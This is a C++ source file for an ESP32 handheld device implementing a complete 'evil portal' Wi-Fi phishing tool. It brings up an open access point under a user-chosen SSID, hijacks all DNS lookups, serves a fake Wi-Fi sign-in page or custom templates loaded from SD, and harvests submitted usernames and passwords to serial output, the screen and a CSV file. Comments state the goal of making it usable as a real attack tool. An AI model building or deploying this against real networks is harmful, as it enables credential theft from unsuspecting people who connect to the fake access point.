#include "wifi_evil_portal.h"
#include "../../ui/screen_scaffold.h"
#include "../../ui/screen_stack.h"
#include "../../hal/storage_sd.h"
#include <feature_registry.h>
#include <lvgl.h>
#include <WiFi.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <cstring>
#include <cstdio>

extern FeatureRegistry g_registry;
extern StorageSD storage; // defined in main.cpp (Phase 1 Task 10)

namespace WifiEvilPortalFeature {

// Real, working generic captive-portal login page -- the built-in fallback
// template, always option 0 in the picker below. User-supplied templates
// (real feature, added 2026-08-15 per direct real-hardware feedback: a
// fixed SSID and a single hardcoded page make this unusable as an actual
// evil-portal tool) are loaded from /quarky/portals/*.html on SD via
// storage.list_files()/read_file() -- the same IStorage abstraction
// wifi_pmkid.cpp's capture-file precedent established, extended here with
// read/list rather than routing raw SD_MMC calls into this file directly.
static const char kPortalHtml[] = R"HTML(
<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Wi-Fi Login</title><style>
body{font-family:sans-serif;background:#f1f3f4;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.card{background:#fff;padding:32px;border-radius:8px;box-shadow:0 1px 3px rgba(0,0,0,.2);width:300px}
input{width:100%;padding:10px;margin:8px 0;box-sizing:border-box;border:1px solid #ccc;border-radius:4px}
button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:none;border-radius:4px;font-size:16px}
</style></head><body><div class="card">
<h3>Sign in to continue</h3>
<form method="POST" action="/submit">
<input name="user" placeholder="Email or phone" required>
<input name="pass" type="password" placeholder="Password" required>
<button type="submit">Next</button>
</form></div></body></html>
)HTML";

static const char kPortalDir[] = "/quarky/portals";
static constexpr int kMaxTemplates = 8;
static constexpr size_t kMaxTemplateBytes = 8192; // generous for a login-form page; bounded, not unbounded RAM use

static DNSServer s_dns;
static AsyncWebServer *s_server = nullptr;
static lv_obj_t *s_log_list = nullptr;
static lv_obj_t *s_status_label = nullptr;
static lv_obj_t *s_ssid_input = nullptr;
static lv_obj_t *s_template_dropdown = nullptr;
static lv_obj_t *s_launch_btn = nullptr;
static lv_obj_t *s_stop_btn = nullptr;
static lv_obj_t *s_keyboard = nullptr;
static bool s_active = false;

// Real feature, added 2026-08-15 per direct real-hardware feedback: captured
// credentials were only ever shown on-screen, never persisted -- closing
// the screen (or losing power) lost them. Written as CSV rows, same
// /quarky/captures/ convention and append-per-event shape wifi_pmkid.cpp's
// pcap writer and ble_sniffer's CSV export both use. One file per launch
// (path set fresh each time launch_click_cb runs), not per-portal-lifetime,
// so distinct Launch sessions don't interleave into one file.
static char s_capture_path[80];

// Names scanned from SD at screen-build time (dropdown index 1.. maps to
// s_template_names[index-1]; index 0 is always "Built-in"). Loaded template
// bytes for whichever option is actually selected at Launch time -- nullptr
// means "use the built-in kPortalHtml".
static char s_template_names[kMaxTemplates][64];
static int s_template_count = 0;
static uint8_t *s_active_template = nullptr;
static size_t s_active_template_len = 0;

static void handle_root(AsyncWebServerRequest *request) {
    if (s_active_template != nullptr) {
        request->send(200, "text/html", s_active_template, s_active_template_len);
    } else {
        request->send(200, "text/html", kPortalHtml);
    }
}

static void handle_submit(AsyncWebServerRequest *request) {
    String user = request->hasParam("user", true) ? request->getParam("user", true)->value() : "";
    String pass = request->hasParam("pass", true) ? request->getParam("pass", true)->value() : "";
    // Real credential capture -- logged to Serial, appended to the on-screen
    // list, and (2026-08-15, real feature added per direct real-hardware
    // feedback) persisted to SD as a CSV row so it survives closing the
    // screen or losing power. This callback runs on AsyncTCP's own task
    // (not the main/LVGL task) -- SD_MMC writes from here are the same
    // shape wifi_pmkid.cpp's promiscuous callback explicitly avoided
    // (that callback runs on the WiFi driver task and defers actual SD
    // writes to poll() on the main task via a ring buffer). This path is
    // different in a way that matters: form submissions are a few per
    // minute at most (a human filling in a login form), not a
    // packets-per-second stream, so a synchronous append_capture_file()
    // call here -- a bounded local SD_MMC write, not a network wait --
    // does not risk the AsyncTCP task's own responsiveness the way
    // unthrottled promiscuous-callback writes would have.
    Serial.printf("quarky-tab5: [evil-portal] captured user='%s' pass='%s'\n", user.c_str(), pass.c_str());
    if (s_capture_path[0] != '\0') {
        char row[192];
        int n = snprintf(row, sizeof(row), "%lu,%s,%s\n", (unsigned long)millis(), user.c_str(), pass.c_str());
        if (!storage.append_capture_file(s_capture_path, (const uint8_t *)row, n)) {
            Serial.println("quarky-tab5: [evil-portal] append_capture_file FAILED");
        }
    }
    if (s_log_list) {
        char row[128];
        snprintf(row, sizeof(row), "%s / %s", user.c_str(), pass.c_str());
        lv_list_add_text(s_log_list, row);
    }
    request->send(200, "text/html", "<html><body>Thank you.</body></html>");
}

// Task review finding (2026-08-14, Critical): tears down everything start()
// brings up. Previously nothing stopped on Back -- s_server/s_dns/s_active
// were untouched by LV_EVENT_DELETE, unlike every other feature in this plan
// (wifi_scan.cpp/wifi_pmkid.cpp/ble_spam.cpp all stop their own background
// activity from this exact handler). Worse than "keeps running silently":
// reopening the screen called `s_server = new AsyncWebServer(80)` again with
// no guard, overwriting the pointer to the still-live previous instance
// (still bound to port 80) with no delete/end() -- a real leak, and a
// plausible second-open bind failure. delete s_server runs AsyncWebServer's
// destructor, which calls its own internal end() (WebServer.cpp) and
// actually releases the TCP listener, not just the LVGL-side state.
static void stop_portal() {
    if (!s_active) return;
    s_dns.stop();
    delete s_server;
    s_server = nullptr;
    WiFi.softAPdisconnect(true); // actually stop the AP, not just the app-level servers
    s_active = false;
    s_capture_path[0] = '\0'; // defensive -- the server is gone so handle_submit()
                              // can't fire again, but this keeps state consistent
}

static void free_active_template() {
    delete[] s_active_template;
    s_active_template = nullptr;
    s_active_template_len = 0;
}

// Blocking-call analysis (build-time review, this task -- see shell.cpp:
// launcher tiles call FeatureModule::on_start directly from an
// LV_EVENT_CLICKED handler on the main/LVGL task, the same call path whose
// blocking STA-connect call crashed the device in wifi_connect.cpp's
// real-hardware fix earlier in this plan). Checked each call this function
// makes against that precedent before shipping it inline rather than moving
// it to a background task:
//   * WiFi.softAP() -> WiFiAP.cpp's softAP() -> AP.begin() -> AP.create().
//     AP.begin() calls enableAP(true) then waitStatusBits(..., 1000) --
//     a BOUNDED wait, hard-capped at 1000ms by the timeout argument, not an
//     unbounded retry-until-success loop like RadioEspHosted::connect_wifi()'s
//     `while (status != WL_CONNECTED) delay(200)` (which had no fixed
//     iteration cap and could run the full 15s). Worst case here is 1s,
//     one fifth of enableLoopWDT()'s ~5s budget, with no failure-driven
//     retries (AP bring-up doesn't do handshake/auth negotiation the way
//     STA connect does, so there's no "wrong password" analog that runs
//     long on the common failure path).
//   * AsyncWebServer::begin() -- creates a listening TCP socket
//     (AsyncTCP/LWIP tcp_new/bind/listen). No network round-trip, no
//     blocking wait on a peer; this is local socket setup only.
//   * DNSServer::start() -- opens a UDP socket and binds port 53. Same
//     shape: local bind, no peer round-trip, no retry loop.
//   * storage.read_file() (real hardware addition, 2026-08-15): a bounded
//     SD_MMC read (kMaxTemplateBytes cap), same class of local, non-network
//     I/O as the file writes wifi_pmkid.cpp already does from this same
//     main/LVGL task -- not a new blocking-risk category.
// None of these matches Task 3's failure shape (an open-ended loop waiting
// on a remote handshake), so this stays inline in the button click handler
// rather than moving to a background FreeRTOS task.
static void launch_click_cb(lv_event_t *e) {
    if (s_active) return; // already running -- Launch is a one-shot action, not a restart

    const char *ssid_text = s_ssid_input ? lv_textarea_get_text(s_ssid_input) : "";
    char ssid[33];
    if (ssid_text[0] != '\0') {
        strncpy(ssid, ssid_text, sizeof(ssid) - 1);
        ssid[sizeof(ssid) - 1] = '\0';
    } else {
        strncpy(ssid, "QuarkyPortal", sizeof(ssid) - 1); // empty input falls back to the original default
        ssid[sizeof(ssid) - 1] = '\0';
    }

    // One capture file per Launch session -- path fixed for the lifetime of
    // this run so every submission during it appends to the same file,
    // distinct Launch sessions don't interleave. Header row (column names)
    // written once here via write_capture_file()'s overwrite semantics;
    // handle_submit() appends one row per real submission.
    snprintf(s_capture_path, sizeof(s_capture_path), "/quarky/captures/wifi/evil_portal_%lu.csv",
             (unsigned long)millis());
    const char kHeader[] = "ms,user,pass\n";
    if (!storage.write_capture_file(s_capture_path, (const uint8_t *)kHeader, sizeof(kHeader) - 1)) {
        Serial.println("quarky-tab5: [evil-portal] capture file header write FAILED -- credentials will not be persisted this session");
        s_capture_path[0] = '\0'; // handle_submit()'s own check skips writing when this is empty
    }

    free_active_template();
    uint16_t selected = s_template_dropdown ? lv_dropdown_get_selected(s_template_dropdown) : 0;
    if (selected > 0 && (int)selected <= s_template_count) {
        char path[128];
        snprintf(path, sizeof(path), "%s/%s", kPortalDir, s_template_names[selected - 1]);
        uint8_t *buf = new uint8_t[kMaxTemplateBytes];
        size_t len = 0;
        if (storage.read_file(path, buf, kMaxTemplateBytes, &len) && len > 0) {
            s_active_template = buf;
            s_active_template_len = len;
        } else {
            delete[] buf;
            Serial.printf("quarky-tab5: [evil-portal] failed to load template '%s', using built-in\n", path);
        }
    }

    // NOT "WIFI_AP_STA" -- corrected task-review comment (was previously
    // inaccurate): this never calls WiFi.mode() directly. WiFi.softAP()
    // internally calls WiFiGenericClass::enableAP(true), which ORs
    // WIFI_MODE_AP into whatever mode is already active -- preserving
    // WIFI_MODE_STA if c2link_wifi (or Task 3's WiFi Connect) already set
    // it, without forcing STA on if nothing did. Same practical effect as
    // wifi_common.cpp/wifi_spectrum.cpp's explicit getMode()-then-mode()
    // pattern, achieved differently. The portal's own AP is a SECOND,
    // independent SoftAP identity -- ESP32 WiFi supports exactly one AP
    // config at a time system-wide, same single-instance constraint
    // ble_spam.cpp hit for BLE advertising, so starting this DOES take over
    // c2link_wifi's AP identity/SSID while the portal runs. stop_portal()
    // (LV_EVENT_DELETE) releases the portal's own AP on Back, but does not
    // restore c2link_wifi's prior AP config -- same class of disclosed,
    // scoped-out follow-up as ble_spam.cpp's C2-advertising re-arm gap.
    WiFi.softAP(ssid);

    s_server = new AsyncWebServer(80);
    s_server->on("/", HTTP_GET, handle_root);
    s_server->on("/submit", HTTP_POST, handle_submit);
    s_server->onNotFound(handle_root); // captive-portal catch-all
    s_server->begin();

    // Task review finding (2026-08-14, Minor): this project's bundled
    // DNSServer (~/.platformio/packages/framework-arduinoespressif32/
    // libraries/DNSServer) is NOT the classic synchronous-poll DNS server
    // the donor codebases' processNextRequest() shape suggests. In this
    // framework version DNSServer::start() wires an AsyncUDP::onPacket
    // callback internally and the wildcard redirect is fully event-driven
    // from there; DNSServer::processNextRequest() is a literal no-op stub
    // ("does nothing actually", DNSServer.h). No poll() needed -- the
    // redirect works from this start() call alone.
    s_dns.start(53, "*", WiFi.softAPIP());
    s_active = true;

    if (s_status_label) {
        char buf[80];
        snprintf(buf, sizeof(buf), "AP: %s (open) -- captured credentials:", ssid);
        lv_label_set_text(s_status_label, buf);
    }
    if (s_ssid_input) lv_obj_add_state(s_ssid_input, LV_STATE_DISABLED);
    if (s_template_dropdown) lv_obj_add_state(s_template_dropdown, LV_STATE_DISABLED);
    if (s_launch_btn) lv_obj_add_flag(s_launch_btn, LV_OBJ_FLAG_HIDDEN);
    if (s_stop_btn) lv_obj_clear_flag(s_stop_btn, LV_OBJ_FLAG_HIDDEN);
}

// Real feature, added 2026-08-15 per direct real-hardware feedback: the only
// way to stop a running portal was Back (which also leaves the screen
// entirely). This lets the operator stop the AP/server/DNS and reconfigure
// (new SSID/template) without losing the credential log already captured --
// stop_portal()/free_active_template() are the exact same teardown
// LV_EVENT_DELETE already calls on Back, just reachable without leaving the
// screen.
static void stop_click_cb(lv_event_t *e) {
    stop_portal();
    free_active_template();
    if (s_status_label) lv_label_set_text(s_status_label, "Not started");
    if (s_ssid_input) lv_obj_clear_state(s_ssid_input, LV_STATE_DISABLED);
    if (s_template_dropdown) lv_obj_clear_state(s_template_dropdown, LV_STATE_DISABLED);
    if (s_launch_btn) lv_obj_clear_flag(s_launch_btn, LV_OBJ_FLAG_HIDDEN);
    if (s_stop_btn) lv_obj_add_flag(s_stop_btn, LV_OBJ_FLAG_HIDDEN);
}

static void input_focus_cb(lv_event_t *e) {
    lv_obj_t *ta = (lv_obj_t *)lv_event_get_target(e);
    lv_keyboard_set_textarea(s_keyboard, ta);
    lv_obj_clear_flag(s_keyboard, LV_OBJ_FLAG_HIDDEN);
}

static lv_obj_t *build_screen() {
    lv_obj_t *content = nullptr;
    lv_obj_t *screen = build_sub_screen("Evil Portal", &content);
    lv_obj_set_flex_flow(content, LV_FLEX_FLOW_COLUMN);

    // Real feature, added 2026-08-15 per direct real-hardware feedback: a
    // custom SSID and a choice of landing page are both required for this
    // to function as an actual evil-portal tool, not just a fixed-identity
    // demo. Same lv_textarea + lv_keyboard focus/show pattern Task 3's WiFi
    // Connect feature already established.
    s_ssid_input = lv_textarea_create(content);
    lv_textarea_set_one_line(s_ssid_input, true);
    lv_textarea_set_placeholder_text(s_ssid_input, "SSID (default: QuarkyPortal)");
    lv_obj_add_event_cb(s_ssid_input, input_focus_cb, LV_EVENT_FOCUSED, nullptr);

    // Dropdown option 0 is always the built-in template; options 1.. are
    // real .html files found under /quarky/portals/ on SD, scanned fresh
    // every time this screen opens (so dropping a new file on the card and
    // reopening the screen picks it up with no reflash needed).
    s_template_count = storage.list_files(kPortalDir, ".html", s_template_names, kMaxTemplates);
    char options[64 + kMaxTemplates * 64];
    strcpy(options, "Built-in (Wi-Fi Login)");
    for (int i = 0; i < s_template_count; i++) {
        strcat(options, "\n");
        strcat(options, s_template_names[i]);
    }
    s_template_dropdown = lv_dropdown_create(content);
    lv_dropdown_set_options(s_template_dropdown, options); // copies into LVGL's own storage

    lv_obj_t *hint = lv_label_create(content);
    if (s_template_count == 0) {
        lv_label_set_text(hint, "No custom templates found in /quarky/portals/*.html on SD");
    } else {
        char hint_buf[64];
        snprintf(hint_buf, sizeof(hint_buf), "%d custom template(s) found on SD", s_template_count);
        lv_label_set_text(hint, hint_buf);
    }

    s_launch_btn = lv_button_create(content);
    lv_obj_t *launch_label = lv_label_create(s_launch_btn);
    lv_label_set_text(launch_label, "Launch Portal");
    lv_obj_add_event_cb(s_launch_btn, launch_click_cb, LV_EVENT_CLICKED, nullptr);

    // Hidden until Launch is tapped (launch_click_cb hides s_launch_btn and
    // shows this instead); stop_click_cb reverses that. Only one of the two
    // is ever visible at a time.
    s_stop_btn = lv_button_create(content);
    lv_obj_t *stop_label = lv_label_create(s_stop_btn);
    lv_label_set_text(stop_label, "Stop Portal");
    lv_obj_add_event_cb(s_stop_btn, stop_click_cb, LV_EVENT_CLICKED, nullptr);
    lv_obj_add_flag(s_stop_btn, LV_OBJ_FLAG_HIDDEN);

    s_status_label = lv_label_create(content);
    lv_label_set_text(s_status_label, "Not started");

    s_log_list = lv_list_create(content);
    lv_obj_set_size(s_log_list, LV_PCT(100), LV_PCT(50));

    s_keyboard = lv_keyboard_create(screen); // parented to screen, not content, so it overlays
    lv_obj_add_flag(s_keyboard, LV_OBJ_FLAG_HIDDEN);

    lv_obj_add_event_cb(content, [](lv_event_t *e) {
        s_log_list = nullptr;
        s_status_label = nullptr;
        s_ssid_input = nullptr;
        s_template_dropdown = nullptr;
        s_launch_btn = nullptr;
        s_stop_btn = nullptr;
        s_keyboard = nullptr;
        stop_portal();
        free_active_template();
    }, LV_EVENT_DELETE, nullptr);

    return screen;
}

void register_module() {
    g_registry.register_module({"wifi_evil_portal", "Evil Portal", Category::WIFI,
                                 Affinity::TAB5_NATIVE, start, nullptr});
}

void start() {
    // Unlike launch_click_cb() (which actually brings up the AP/server/DNS),
    // start() now only builds the configuration screen -- the portal itself
    // doesn't go live until the user picks an SSID/template and taps
    // Launch. This replaces the old behavior of bringing the portal up
    // immediately on screen open with a fixed "QuarkyPortal" SSID and the
    // built-in template only.
    ScreenStack::push(build_screen());
}

} // namespace WifiEvilPortalFeature
